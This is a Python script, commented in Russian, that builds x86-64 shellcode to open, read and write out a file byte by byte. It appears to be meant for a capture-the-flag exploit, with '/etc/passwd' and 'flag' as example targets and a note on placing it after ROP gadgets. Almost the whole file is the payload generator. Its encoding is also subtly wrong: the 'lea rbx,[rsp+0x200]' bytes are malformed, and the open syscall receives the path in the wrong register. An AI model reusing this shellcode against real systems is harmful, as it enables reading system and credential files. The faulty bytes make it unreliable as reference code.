#!/usr/bin/env python3
"""
bytewise_shellcode.py — построение shellcode open/read/write с bytewise
записью пути (полезно при лимите read() 0x80 и ограничении push imm32).
Использование:
    sc = bytewise_open_read_write(b"/etc/passwd")
    # вставить в payload после jmp rsi / иных гаджетов
Возвращает байты shellcode (без адресов).
"""

import struct


def bytewise_open_read_write(path: bytes, out_fd: int = 1) -> bytes:
    """Генерирует shellcode:
       lea rbx,[rsp+0x200]      # область записи пути (выше guard page)
       mov byte [rbx+i], ch      # для каждого байта пути
       mov byte [rbx+N], 0       # null-терминатор
       xor rdi,rdi; lea rsi,[rbx]; xor rdx,rdx
       mov eax,2; syscall        # open(path, O_RDONLY)
       mov edi,eax; mov rsi,rbx; mov edx,0xff
       xor eax,eax; syscall      # read(fd, buf, 0xff)
       mov edi,{out_fd}; mov eax,1; syscall   # write(1, buf, n)
    """
    inner = b""
    for i, ch in enumerate(path):
        # mov byte [rbx+i], ch  ->  mov cl, ch; mov [rbx+i], cl
        inner += b"\xb1" + bytes([ch])          # mov cl, imm8
        inner += b"\x88\x4b" + bytes([i])       # mov [rbx+i], cl
    inner += b"\xc6\x43" + bytes([len(path)]) + b"\x00"  # mov byte [rbx+N],0

    shellcode = b""
    shellcode += b"\x48\x8d\x5c\x24\x00\x80"    # lea rbx,[rsp+0x200]
    shellcode += inner
    shellcode += b"\x48\x31\xff"                # xor rdi,rdi
    shellcode += b"\x48\x8d\x33"                # lea rsi,[rbx]
    shellcode += b"\x48\x31\xd2"                # xor rdx,rdx
    shellcode += b"\xb8\x02\x00\x00\x00"        # mov eax,2 (open)
    shellcode += b"\x0f\x05"                    # syscall
    shellcode += b"\x89\xc7"                    # mov edi,eax
    shellcode += b"\x48\x89\xde"                # mov rsi,rbx
    shellcode += b"\xba\xff\x00\x00\x00"        # mov edx,0xff
    shellcode += b"\x31\xc0"                    # xor eax,eax
    shellcode += b"\x0f\x05"                    # syscall (read)
    shellcode += b"\xbf" + struct.pack("<I", out_fd)  # mov edi,out_fd
    shellcode += b"\xb8\x01\x00\x00\x00"        # mov eax,1 (write)
    shellcode += b"\x0f\x05"                    # syscall
    return shellcode


if __name__ == "__main__":
    sc = bytewise_open_read_write(b"flag")
    has_nops = b"\x90" in sc
    print(f"len={len(sc)}")
    print(f"bytes = {sc.hex()}")
    print(f"contains nops needed? {has_nops}")
